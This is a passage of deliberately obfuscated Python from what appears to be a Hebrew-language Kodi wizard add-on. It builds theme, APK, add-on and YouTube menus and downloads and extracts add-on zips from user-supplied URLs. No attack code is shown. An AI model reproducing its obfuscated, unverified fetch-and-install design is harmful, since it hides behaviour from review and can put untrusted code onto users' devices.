		OO0OOO000OOO000OO =int (float (KODIV ));O0OO0O00O000OO0OO =int (float (OO0000OO000O0O000 ))#line:2082
		if not OO0OOO000OOO000OO ==O0OO0O00O000OO0OO :#line:2083
			if OO0OOO000OOO000OO ==16 and O0OO0O00O000OO0OO <=15 :OO0O0OO000O0OOO00 =False #line:2084
			else :OO0O0OO000O0OOO00 =True #line:2085
		else :OO0O0OO000O0OOO00 =False #line:2086
		addFile ('התקנה','install',OO00OO00O00OO00O0 ,'fresh',description =O00O0O0OOO0O00O0O ,fanart =OO0O0OOO000OO0O0O ,icon =O000O0O0O0O0O0O00 ,themeit =THEME1 )#line:2090
		if not OOOOOO0000OO00OOO =='http://':#line:2093
			if wiz .workingURL (OOOOOO0000OO00OOO )==True :#line:2094
				addFile (wiz .sep ('THEMES'),'',fanart =OO0O0OOO000OO0O0O ,icon =O000O0O0O0O0O0O00 ,themeit =THEME3 )#line:2095
				OOO00OO00OOOOOOO0 =wiz .openURL (OOOOOO0000OO00OOO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2096
				OO00000O0OO0O000O =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OOO00OO00OOOOOOO0 )#line:2097
				for O0O0O00O0O00OO000 ,OO0OOO00OO0O00OO0 ,O0000OOO00000OOOO ,O0000000OOOO0OOOO ,OOO0000000OO0O00O ,O00O0O0OOO0O00O0O in OO00000O0OO0O000O :#line:2098
					if not SHOWADULT =='true'and OOO0000000OO0O00O .lower ()=='yes':continue #line:2099
					O0000OOO00000OOOO =O0000OOO00000OOOO if O0000OOO00000OOOO =='http://'else O000O0O0O0O0O0O00 #line:2100
					O0000000OOOO0OOOO =O0000000OOOO0OOOO if O0000000OOOO0OOOO =='http://'else OO0O0OOO000OO0O0O #line:2101
					addFile (O0O0O00O0O00OO000 if not O0O0O00O0O00OO000 ==BUILDTHEME else "[B]%s (Installed)[/B]"%O0O0O00O0O00OO000 ,'theme',OO00OO00O00OO00O0 ,O0O0O00O0O00OO000 ,description =O00O0O0OOO0O00O0O ,fanart =O0000000OOOO0OOOO ,icon =O0000OOO00000OOOO ,themeit =THEME3 )#line:2102
	setView ('files','viewType')#line:2103
def viewThirdList (OO0O0OO00O000OO00 ):#line:2105
	O00O0OO000OOOOOOO =eval ('THIRD%sNAME'%OO0O0OO00O000OO00 )#line:2106
	O0O0O000O00OOO0OO =eval ('THIRD%sURL'%OO0O0OO00O000OO00 )#line:2107
	OO0OOOOOO00OOO0O0 =wiz .workingURL (O0O0O000O00OOO0OO )#line:2108
	if not OO0OOOOOO00OOO0O0 ==True :#line:2109
		addFile ('Url for txt file not valid','',icon =ICONBUILDS ,themeit =THEME3 )#line:2110
		addFile ('%s'%WORKINGURL ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2111
	else :#line:2112
		OOO0O0000OO0OOO00 ,O00O000OOOO00O000 =wiz .thirdParty (O0O0O000O00OOO0OO )#line:2113
		addFile ("[B]%s[/B]"%O00O0OO000OOOOOOO ,'',themeit =THEME3 )#line:2114
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2115
		if OOO0O0000OO0OOO00 :#line:2116
			for O00O0OO000OOOOOOO ,OO0OO0OO0OOO0O0O0 ,O0O0O000O00OOO0OO ,O0OOO00O0O0O0O00O ,O00000OO0O00OOO00 ,O0O0O00000OO000OO ,OO00000O0O0OOO000 ,OO0OOOO00OOO0OOO0 in O00O000OOOO00O000 :#line:2117
				if not SHOWADULT =='true'and OO00000O0O0OOO000 .lower ()=='yes':continue #line:2118
				addFile ("[%s] %s v%s"%(O0OOO00O0O0O0O00O ,O00O0OO000OOOOOOO ,OO0OO0OO0OOO0O0O0 ),'installthird',O00O0OO000OOOOOOO ,O0O0O000O00OOO0OO ,icon =O00000OO0O00OOO00 ,fanart =O0O0O00000OO000OO ,description =OO0OOOO00OOO0OOO0 ,themeit =THEME2 )#line:2119
		else :#line:2120
			for O00O0OO000OOOOOOO ,O0O0O000O00OOO0OO ,O00000OO0O00OOO00 ,O0O0O00000OO000OO ,OO0OOOO00OOO0OOO0 in O00O000OOOO00O000 :#line:2121
				addFile (O00O0OO000OOOOOOO ,'installthird',O00O0OO000OOOOOOO ,O0O0O000O00OOO0OO ,icon =O00000OO0O00OOO00 ,fanart =O0O0O00000OO000OO ,description =OO0OOOO00OOO0OOO0 ,themeit =THEME2 )#line:2122
def editThirdParty (O0OOO000000OOOOOO ):#line:2124
	OOO00O0OOO00O0000 =eval ('THIRD%sNAME'%O0OOO000000OOOOOO )#line:2125
	OOO000O00O0OOOO00 =eval ('THIRD%sURL'%O0OOO000000OOOOOO )#line:2126
	O00O00OO0O000O0OO =wiz .getKeyboard (OOO00O0OOO00O0000 ,'Enter the Name of the Wizard')#line:2127
	O000OOO0O0OO000OO =wiz .getKeyboard (OOO000O00O0OOOO00 ,'Enter the URL of the Wizard Text')#line:2128
	wiz .setS ('wizard%sname'%O0OOO000000OOOOOO ,O00O00OO0O000O0OO )#line:2130
	wiz .setS ('wizard%surl'%O0OOO000000OOOOOO ,O000OOO0O0OO000OO )#line:2131
def apkScraper (name =""):#line:2133
	if name =='kodi':#line:2134
		OOO0OO00O00OOO000 ='http://mirrors.kodi.tv/releases/android/arm/'#line:2135
		O000OOOO0OO0OOOOO ='http://mirrors.kodi.tv/releases/android/arm/old/'#line:2136
		O000OO000OOOOOO0O =wiz .openURL (OOO0OO00O00OOO000 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2137
		O00OOO0OO000O0OO0 =wiz .openURL (O000OOOO0OO0OOOOO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2138
		OO0O0OO0OOOOO000O =0 #line:2139
		OOO0OOO0O0O0OO0O0 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (O000OO000OOOOOO0O )#line:2140
		O0OOOO00O0O0OOO00 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (O00OOO0OO000O0OO0 )#line:2141
		addFile ("Official Kodi Apk\'s",themeit =THEME1 )#line:2143
		O0OO000O000OO0O00 =False #line:2144
		for OOOOOOO0O0O00OO00 ,name ,O00OOO00O0OOOOOOO ,OOO0000O0O0OOO0OO in OOO0OOO0O0O0OO0O0 :#line:2145
			if OOOOOOO0O0O00OO00 in ['../','old/']:continue #line:2146
			if not OOOOOOO0O0O00OO00 .endswith ('.apk'):continue #line:2147
			if not OOOOOOO0O0O00OO00 .find ('_')==-1 and O0OO000O000OO0O00 ==True :continue #line:2148
			try :#line:2149
				OOOOOO00O0O00O0O0 =name .split ('-')#line:2150
				if not OOOOOOO0O0O00OO00 .find ('_')==-1 :#line:2151
					O0OO000O000OO0O00 =True #line:2152
					OOOOOOO000O000O0O ,O00O0O0OOO0OO0O00 =OOOOOO00O0O00O0O0 [2 ].split ('_')#line:2153
				else :#line:2154
					OOOOOOO000O000O0O =OOOOOO00O0O00O0O0 [2 ]#line:2155
					O00O0O0OOO0OO0O00 =''#line:2156
				O00000OOO00O000O0 ="[COLOR %s]%s v%s%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOOOO00O0O00O0O0 [0 ].title (),OOOOOO00O0O00O0O0 [1 ],O00O0O0OOO0OO0O00 .upper (),OOOOOOO000O000O0O ,COLOR2 ,O00OOO00O0OOOOOOO .replace (' ',''),COLOR1 ,OOO0000O0O0OOO0OO )#line:2157
				O00000000O00O0OO0 =urljoin (OOO0OO00O00OOO000 ,OOOOOOO0O0O00OO00 )#line:2158
				addFile (O00000OOO00O000O0 ,'apkinstall',"%s v%s%s %s"%(OOOOOO00O0O00O0O0 [0 ].title (),OOOOOO00O0O00O0O0 [1 ],O00O0O0OOO0OO0O00 .upper (),OOOOOOO000O000O0O ),O00000000O00O0OO0 )#line:2159
				OO0O0OO0OOOOO000O +=1 #line:2160
			except :#line:2161
				wiz .log ("Error on: %s"%name )#line:2162
		for OOOOOOO0O0O00OO00 ,name ,O00OOO00O0OOOOOOO ,OOO0000O0O0OOO0OO in O0OOOO00O0O0OOO00 :#line:2164
			if OOOOOOO0O0O00OO00 in ['../','old/']:continue #line:2165
			if not OOOOOOO0O0O00OO00 .endswith ('.apk'):continue #line:2166
			if not OOOOOOO0O0O00OO00 .find ('_')==-1 :continue #line:2167
			try :#line:2168
				OOOOOO00O0O00O0O0 =name .split ('-')#line:2169
				O00000OOO00O000O0 ="[COLOR %s]%s v%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOOOO00O0O00O0O0 [0 ].title (),OOOOOO00O0O00O0O0 [1 ],OOOOOO00O0O00O0O0 [2 ],COLOR2 ,O00OOO00O0OOOOOOO .replace (' ',''),COLOR1 ,OOO0000O0O0OOO0OO )#line:2170
				O00000000O00O0OO0 =urljoin (O000OOOO0OO0OOOOO ,OOOOOOO0O0O00OO00 )#line:2171
				addFile (O00000OOO00O000O0 ,'apkinstall',"%s v%s %s"%(OOOOOO00O0O00O0O0 [0 ].title (),OOOOOO00O0O00O0O0 [1 ],OOOOOO00O0O00O0O0 [2 ]),O00000000O00O0OO0 )#line:2172
				OO0O0OO0OOOOO000O +=1 #line:2173
			except :#line:2174
				wiz .log ("Error on: %s"%name )#line:2175
		if OO0O0OO0OOOOO000O ==0 :addFile ("Error Kodi Scraper Is Currently Down.")#line:2176
	elif name =='spmc':#line:2177
		O0OO0OO0OO0OOO0O0 ='https://github.com/koying/SPMC/releases'#line:2178
		O000OO000OOOOOO0O =wiz .openURL (O0OO0OO0OO0OOO0O0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2179
		OO0O0OO0OOOOO000O =0 #line:2180
		OOO0OOO0O0O0OO0O0 =re .compile ('<div.+?lass="release-body.+?div class="release-header".+?a href=.+?>(.+?)</a>.+?ul class="release-downloads">(.+?)</ul>.+?/div>').findall (O000OO000OOOOOO0O )#line:2181
		addFile ("Official SPMC Apk\'s",themeit =THEME1 )#line:2183
		for name ,O0000OOOOOO00O00O in OOO0OOO0O0O0OO0O0 :#line:2185
			O0OOOO0000OOOO000 =''#line:2186
			O0OOOO00O0O0OOO00 =re .compile ('<li>.+?<a href="(.+?)" rel="nofollow">.+?<small class="text-gray float-right">(.+?)</small>.+?strong>(.+?)</strong>.+?</a>.+?</li>').findall (O0000OOOOOO00O00O )#line:2187
			for O00OO00OO0O000000 ,OO0000O0OOO000000 ,OOOOOOO00O00OO0O0 in O0OOOO00O0O0OOO00 :#line:2188
				if OOOOOOO00O00OO0O0 .find ('armeabi')==-1 :continue #line:2189
				if OOOOOOO00O00OO0O0 .find ('launcher')>-1 :continue #line:2190
				O0OOOO0000OOOO000 =urljoin ('https://github.com',O00OO00OO0O000000 )#line:2191
				break #line:2192
		if OO0O0OO0OOOOO000O ==0 :addFile ("Error SPMC Scraper Is Currently Down.")#line:2194
def apkMenu (url =None ):#line:2196
	if url ==None :#line:2197
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2200
	if not APKFILE =='http://':#line:2201
		if url ==None :#line:2202
			O00OOOO0OO0000O00 =wiz .workingURL (APKFILE )#line:2203
			OOO0O00O0000OOO00 =uservar .APKFILE #line:2204
		else :#line:2205
			O00OOOO0OO0000O00 =wiz .workingURL (url )#line:2206
			OOO0O00O0000OOO00 =url #line:2207
		if O00OOOO0OO0000O00 ==True :#line:2208
			OOO0OOO0000OOO0OO =wiz .openURL (OOO0O00O0000OOO00 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2209
			O0OO0OO00O0000OO0 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OOO0OOO0000OOO0OO )#line:2210
			if len (O0OO0OO00O0000OO0 )>0 :#line:2211
				O00O000O0000OOOOO =0 #line:2212
				for OO0O0OOOO00O0000O ,O000O00000OOO0O0O ,url ,O000OO0OOOOO0OO00 ,OOO00OO00OO0000O0 ,O00OO0O0000000OOO ,O0OOOO0OOO0O000O0 in O0OO0OO00O0000OO0 :#line:2213
					if not SHOWADULT =='true'and O00OO0O0000000OOO .lower ()=='yes':continue #line:2214
					if O000O00000OOO0O0O .lower ()=='yes':#line:2215
						O00O000O0000OOOOO +=1 #line:2216
						addDir ("[B]%s[/B]"%OO0O0OOOO00O0000O ,'apk',url ,description =O0OOOO0OOO0O000O0 ,icon =O000OO0OOOOO0OO00 ,fanart =OOO00OO00OO0000O0 ,themeit =THEME3 )#line:2217
					else :#line:2218
						O00O000O0000OOOOO +=1 #line:2219
						addFile (OO0O0OOOO00O0000O ,'apkinstall',OO0O0OOOO00O0000O ,url ,description =O0OOOO0OOO0O000O0 ,icon =O000OO0OOOOO0OO00 ,fanart =OOO00OO00OO0000O0 ,themeit =THEME2 )#line:2220
					if O00O000O0000OOOOO <1 :#line:2221
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2222
			else :wiz .log ("[APK Menu] ERROR: Invalid Format.",xbmc .LOGERROR )#line:2223
		else :#line:2224
			wiz .log ("[APK Menu] ERROR: URL for apk list not working.",xbmc .LOGERROR )#line:2225
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2226
			addFile ('%s'%O00OOOO0OO0000O00 ,'',themeit =THEME3 )#line:2227
		return #line:2228
	else :wiz .log ("[APK Menu] No APK list added.")#line:2229
	setView ('files','viewType')#line:2230
def addonMenu (url =None ):#line:2232
	if not ADDONFILE =='http://':#line:2233
		if url ==None :#line:2234
			O0OO0OOOO0O00O000 =wiz .workingURL (ADDONFILE )#line:2235
			O0OO0000OOO00OO00 =uservar .ADDONFILE #line:2236
		else :#line:2237
			O0OO0OOOO0O00O000 =wiz .workingURL (url )#line:2238
			O0OO0000OOO00OO00 =url #line:2239
		if O0OO0OOOO0O00O000 ==True :#line:2240
			O00OOO00O0000O000 =wiz .openURL (O0OO0000OOO00OO00 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2241
			OO0OO00000O0O0O00 =re .compile ('name="(.+?)".+?lugin="(.+?)".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O00OOO00O0000O000 )#line:2242
			if len (OO0OO00000O0O0O00 )>0 :#line:2243
				OOOO0O0O000OOOO0O =0 #line:2244
				for OOOO0O0O0O0O0O000 ,O0O0O0O0O00OO0000 ,url ,OOO0OO00O0OO00OOO ,OOO00O00O000000OO ,OO00O0OO000OO000O ,O00OOOOOOOOOO0000 ,O0O0OO00000OO000O ,OO0O0O0OO000O0O0O ,OOOO0O00OOO000OO0 in OO0OO00000O0O0O00 :#line:2245
					if O0O0O0O0O00OO0000 .lower ()=='section':#line:2246
						OOOO0O0O000OOOO0O +=1 #line:2247
						addDir ("[B]%s[/B]"%OOOO0O0O0O0O0O000 ,'addons',url ,description =OOOO0O00OOO000OO0 ,icon =O00OOOOOOOOOO0000 ,fanart =O0O0OO00000OO000O ,themeit =THEME3 )#line:2248
					else :#line:2249
						if not SHOWADULT =='true'and OO0O0O0OO000O0O0O .lower ()=='yes':continue #line:2250
						try :#line:2251
							O0000OOOO0000OOO0 =xbmcaddon .Addon (id =O0O0O0O0O00OO0000 ).getAddonInfo ('path')#line:2252
							if os .path .exists (O0000OOOO0000OOO0 ):#line:2253
								OOOO0O0O0O0O0O000 ="[COLOR green][Installed][/COLOR] %s"%OOOO0O0O0O0O0O000 #line:2254
						except :#line:2255
							pass #line:2256
						OOOO0O0O000OOOO0O +=1 #line:2257
						addFile (OOOO0O0O0O0O0O000 ,'addoninstall',O0O0O0O0O00OO0000 ,O0OO0000OOO00OO00 ,description =OOOO0O00OOO000OO0 ,icon =O00OOOOOOOOOO0000 ,fanart =O0O0OO00000OO000O ,themeit =THEME2 )#line:2258
					if OOOO0O0O000OOOO0O <1 :#line:2259
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2260
			else :#line:2261
				addFile ('Text File not formated correctly!','',themeit =THEME3 )#line:2262
				wiz .log ("[Addon Menu] ERROR: Invalid Format.")#line:2263
		else :#line:2264
			wiz .log ("[Addon Menu] ERROR: URL for Addon list not working.")#line:2265
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2266
			addFile ('%s'%O0OO0OOOO0O00O000 ,'',themeit =THEME3 )#line:2267
	else :wiz .log ("[Addon Menu] No Addon list added.")#line:2268
	setView ('files','viewType')#line:2269
def addonInstaller (OOO0OO000OOO0O0OO ,O0O0O0O0O000O0OO0 ):#line:2271
	if not ADDONFILE =='http://':#line:2272
		OO0O00O000O0O00OO =wiz .workingURL (O0O0O0O0O000O0OO0 )#line:2273
		if OO0O00O000O0O00OO ==True :#line:2274
			OOOOOO0000O0OOO00 =wiz .openURL (O0O0O0O0O000O0OO0 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2275
			OOOO0OO0OO00000OO =re .compile ('name="(.+?)".+?lugin="%s".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%OOO0OO000OOO0O0OO ).findall (OOOOOO0000O0OOO00 )#line:2276
			if len (OOOO0OO0OO00000OO )>0 :#line:2277
				for OO0O0O0O00O0O0000 ,O0O0O0O0O000O0OO0 ,OOOO0O0O0OOOOO00O ,O0O0O00OO0O0O0000 ,OO0OOO0000O00OOOO ,O000O00000OO000OO ,O0O00OOO000O0O0OO ,O0OO00O00000OOO0O ,OO0OO0O0OO0OOOOOO in OOOO0OO0OO00000OO :#line:2278
					if os .path .exists (os .path .join (ADDONS ,OOO0OO000OOO0O0OO )):#line:2279
						OOO0O00OO0OO00OO0 =['Launch Addon','Remove Addon']#line:2280
						O00O00OOOO0000O0O =DIALOG .select ("[COLOR %s]Addon already installed what would you like to do?[/COLOR]"%COLOR2 ,OOO0O00OO0OO00OO0 )#line:2281
						if O00O00OOOO0000O0O ==0 :#line:2282
							wiz .ebi ('RunAddon(%s)'%OOO0OO000OOO0O0OO )#line:2283
							xbmc .sleep (1000 )#line:2284
							return True #line:2285
						elif O00O00OOOO0000O0O ==1 :#line:2286
							wiz .cleanHouse (os .path .join (ADDONS ,OOO0OO000OOO0O0OO ))#line:2287
							try :wiz .removeFolder (os .path .join (ADDONS ,OOO0OO000OOO0O0OO ))#line:2288
							except :pass #line:2289
							if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove the addon_data for:"%COLOR2 ,"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,OOO0OO000OOO0O0OO ),yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2290
								removeAddonData (OOO0OO000OOO0O0OO )#line:2291
							wiz .refresh ()#line:2292
							return True #line:2293
						else :#line:2294
							return False #line:2295
					OOOOO0000O0O0O0OO =os .path .join (ADDONS ,OOOO0O0O0OOOOO00O )#line:2296
					if not OOOO0O0O0OOOOO00O .lower ()=='none'and not os .path .exists (OOOOO0000O0O0O0OO ):#line:2297
						wiz .log ("Repository not installed, installing it")#line:2298
						if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to install the repository for [COLOR %s]%s[/COLOR]:"%(COLOR2 ,COLOR1 ,OOO0OO000OOO0O0OO ),"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,OOOO0O0O0OOOOO00O ),yeslabel ="[B][COLOR green]Yes Install[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2299
							OOOO0OO00O0O0O000 =wiz .parseDOM (wiz .openURL (O0O0O00OO0O0O0000 ),'addon',ret ='version',attrs ={'id':OOOO0O0O0OOOOO00O })#line:2300
							if len (OOOO0OO00O0O0O000 )>0 :#line:2301
								O00OOO0O0O00O000O ='%s%s-%s.zip'%(OO0OOO0000O00OOOO ,OOOO0O0O0OOOOO00O ,OOOO0OO00O0O0O000 [0 ])#line:2302
								wiz .log (O00OOO0O0O00O000O )#line:2303
								if KODIV >=17 :wiz .addonDatabase (OOOO0O0O0OOOOO00O ,1 )#line:2304
								installAddon (OOOO0O0O0OOOOO00O ,O00OOO0O0O00O000O )#line:2305
								wiz .ebi ('UpdateAddonRepos()')#line:2306
								wiz .log ("Installing Addon from Kodi")#line:2308
								OOOO0O0O00O0000O0 =installFromKodi (OOO0OO000OOO0O0OO )#line:2309
								wiz .log ("Install from Kodi: %s"%OOOO0O0O00O0000O0 )#line:2310
								if OOOO0O0O00O0000O0 :#line:2311
									wiz .refresh ()#line:2312
									return True #line:2313
							else :#line:2314
								wiz .log ("[Addon Installer] Repository not installed: Unable to grab url! (%s)"%OOOO0O0O0OOOOO00O )#line:2315
						else :wiz .log ("[Addon Installer] Repository for %s not installed: %s"%(OOO0OO000OOO0O0OO ,OOOO0O0O0OOOOO00O ))#line:2316
					elif OOOO0O0O0OOOOO00O .lower ()=='none':#line:2317
						wiz .log ("No repository, installing addon")#line:2318
						O0000O0OO0O0OO00O =OOO0OO000OOO0O0OO #line:2319
						O00000O00000O000O =O0O0O0O0O000O0OO0 #line:2320
						installAddon (OOO0OO000OOO0O0OO ,O0O0O0O0O000O0OO0 )#line:2321
						wiz .refresh ()#line:2322
						return True #line:2323
					else :#line:2324
						wiz .log ("Repository installed, installing addon")#line:2325
						OOOO0O0O00O0000O0 =installFromKodi (OOO0OO000OOO0O0OO ,False )#line:2326
						if OOOO0O0O00O0000O0 :#line:2327
							wiz .refresh ()#line:2328
							return True #line:2329
					if os .path .exists (os .path .join (ADDONS ,OOO0OO000OOO0O0OO )):return True #line:2330
					O00OO00OOO00000O0 =wiz .parseDOM (wiz .openURL (O0O0O00OO0O0O0000 ),'addon',ret ='version',attrs ={'id':OOO0OO000OOO0O0OO })#line:2331
					if len (O00OO00OOO00000O0 )>0 :#line:2332
						O0O0O0O0O000O0OO0 ="%s%s-%s.zip"%(O0O0O0O0O000O0OO0 ,OOO0OO000OOO0O0OO ,O00OO00OOO00000O0 [0 ])#line:2333
						wiz .log (str (O0O0O0O0O000O0OO0 ))#line:2334
						if KODIV >=17 :wiz .addonDatabase (OOO0OO000OOO0O0OO ,1 )#line:2335
						installAddon (OOO0OO000OOO0O0OO ,O0O0O0O0O000O0OO0 )#line:2336
						wiz .refresh ()#line:2337
					else :#line:2338
						wiz .log ("no match");return False #line:2339
			else :wiz .log ("[Addon Installer] Invalid Format")#line:2340
		else :wiz .log ("[Addon Installer] Text File: %s"%OO0O00O000O0O00OO )#line:2341
	else :wiz .log ("[Addon Installer] Not Enabled.")#line:2342
def installFromKodi (OO0O0O0O0O0O0000O ,over =True ):#line:2344
	if over ==True :#line:2345
		xbmc .sleep (2000 )#line:2346
	wiz .ebi ('RunPlugin(plugin://%s)'%OO0O0O0O0O0O0000O )#line:2348
	if not wiz .whileWindow ('yesnodialog'):#line:2349
		return False #line:2350
	xbmc .sleep (1000 )#line:2351
	if wiz .whileWindow ('okdialog'):#line:2352
		return False #line:2353
	wiz .whileWindow ('progressdialog')#line:2354
	if os .path .exists (os .path .join (ADDONS ,OO0O0O0O0O0O0000O )):return True #line:2355
	else :return False #line:2356
def installAddon (O00O00OO00O0OOOO0 ,O00O0OOO000O00OOO ):#line:2358
	if not wiz .workingURL (O00O0OOO000O00OOO )==True :wiz .LogNotify ("[COLOR %s]Addon Installer[/COLOR]"%COLOR1 ,'[COLOR %s]%s:[/COLOR] [COLOR %s]קישור זיפ לא תקין![/COLOR]'%(COLOR1 ,O00O00OO00O0OOOO0 ,COLOR2 ));return #line:2359
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2360
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00O00OO00O0OOOO0 ),'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2361
	OO0O0O0000O0OOOOO =O00O0OOO000O00OOO .split ('/')#line:2362
	OO0O0OOO00000O000 =os .path .join (PACKAGES ,OO0O0O0000O0OOOOO [-1 ])#line:2363
	try :os .remove (OO0O0OOO00000O000 )#line:2364
	except :pass #line:2365
	downloader .download (O00O0OOO000O00OOO ,OO0O0OOO00000O000 ,DP )#line:2366
	O0O00O000OOOO00O0 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00O00OO00O0OOOO0 )#line:2367
	DP .update (0 ,O0O00O000OOOO00O0 ,'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2368
	OO00000O0000O000O ,O0OOO00OOO000OO0O ,OOOO0OO00O000O0OO =extract .all (OO0O0OOO00000O000 ,ADDONS ,DP ,title =O0O00O000OOOO00O0 )#line:2369
	DP .update (0 ,O0O00O000OOOO00O0 ,'','[COLOR %s]מתקין תלויות[/COLOR]'%COLOR2 )#line:2370
	installed (O00O00OO00O0OOOO0 )#line:2371
	installDep (O00O00OO00O0OOOO0 ,DP )#line:2372
	DP .close ()#line:2373
	wiz .ebi ('UpdateAddonRepos()')#line:2374
	wiz .ebi ('UpdateLocalAddons()')#line:2375
	wiz .refresh ()#line:2376
def installDep (OOO0000O00OO000O0 ,DP =None ):#line:2378
	OO0000O00000OO0O0 =os .path .join (ADDONS ,OOO0000O00OO000O0 ,'addon.xml')#line:2379
	if os .path .exists (OO0000O00000OO0O0 ):#line:2380
		OOO0O0O0O00000OO0 =open (OO0000O00000OO0O0 ,mode ='r');OO0OOO0OO0OO0O000 =OOO0O0O0O00000OO0 .read ();OOO0O0O0O00000OO0 .close ();#line:2381
		OO0000OOOO000OO0O =wiz .parseDOM (OO0OOO0OO0OO0O000 ,'import',ret ='addon')#line:2382
		for OOOOO000OO0OOO0OO in OO0000OOOO000OO0O :#line:2383
			if not 'xbmc.python'in OOOOO000OO0OOO0OO :#line:2384
				if not DP ==None :#line:2385
					DP .update (0 ,'','[COLOR %s]%s[/COLOR]'%(COLOR1 ,OOOOO000OO0OOO0OO ))#line:2386
				wiz .createTemp (OOOOO000OO0OOO0OO )#line:2387
def installed (O0O0000OO0000O00O ):#line:2414
	OOOO0O0OOOO000OOO =os .path .join (ADDONS ,O0O0000OO0000O00O ,'addon.xml')#line:2415
	if os .path .exists (OOOO0O0OOOO000OOO ):#line:2416
		try :#line:2417
			OO00O0O0O000OO0O0 =open (OOOO0O0OOOO000OOO ,mode ='r');OOO000O0OOOO0OO00 =OO00O0O0O000OO0O0 .read ();OO00O0O0O000OO0O0 .close ()#line:2418
			O0OOOO0O000O00OOO =wiz .parseDOM (OOO000O0OOOO0OO00 ,'addon',ret ='name',attrs ={'id':O0O0000OO0000O00O })#line:2419
			O0OOO00OOO00O000O =os .path .join (ADDONS ,O0O0000OO0000O00O ,'icon.png')#line:2420
			wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,O0OOOO0O000O00OOO [0 ]),'[COLOR %s]מאפשר הרחבות[/COLOR]'%COLOR2 ,'2000',O0OOO00OOO00O000O )#line:2421
		except :pass #line:2422
def youtubeMenu (url =None ):#line:2424
	if not YOUTUBEFILE =='http://':#line:2425
		if url ==None :#line:2426
			OOO000O0OOO00000O =wiz .workingURL (YOUTUBEFILE )#line:2427
			OOOO000O00000000O =uservar .YOUTUBEFILE #line:2428
		else :#line:2429
			OOO000O0OOO00000O =wiz .workingURL (url )#line:2430
			OOOO000O00000000O =url #line:2431
		if OOO000O0OOO00000O ==True :#line:2432
			O00000O000OO0O000 =wiz .openURL (OOOO000O00000000O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2433
			O0OOO0OO0O0O0O0O0 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O00000O000OO0O000 )#line:2434
			if len (O0OOO0OO0O0O0O0O0 )>0 :#line:2435
				for O00OO0OO0OOO0OO00 ,OOO0O000000OO00O0 ,url ,O0OOOO00O000OO000 ,OOOO00000O0O000OO ,O000OOO00O0OO000O in O0OOO0OO0O0O0O0O0 :#line:2436
					if OOO0O000000OO00O0 .lower ()=="yes":#line:2437
						addDir ("[B]%s[/B]"%O00OO0OO0OOO0OO00 ,'youtube',url ,description =O000OOO00O0OO000O ,icon =O0OOOO00O000OO000 ,fanart =OOOO00000O0O000OO ,themeit =THEME3 )#line:2438
					else :#line:2439
						addFile (O00OO0OO0OOO0OO00 ,'viewVideo',url =url ,description =O000OOO00O0OO000O ,icon =O0OOOO00O000OO000 ,fanart =OOOO00000O0O000OO ,themeit =THEME2 )#line:2440
			else :wiz .log ("[YouTube Menu] ERROR: Invalid Format.")#line:2441
		else :#line:2442
			wiz .log ("[YouTube Menu] ERROR: URL for YouTube list not working.")#line:2443
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2444
			addFile ('%s'%OOO000O0OOO00000O ,'',themeit =THEME3 )#line:2445
	else :wiz .log ("[YouTube Menu] No YouTube list added.")#line:2446
	setView ('files','viewType')#line:2447
def STARTP ():#line:2448
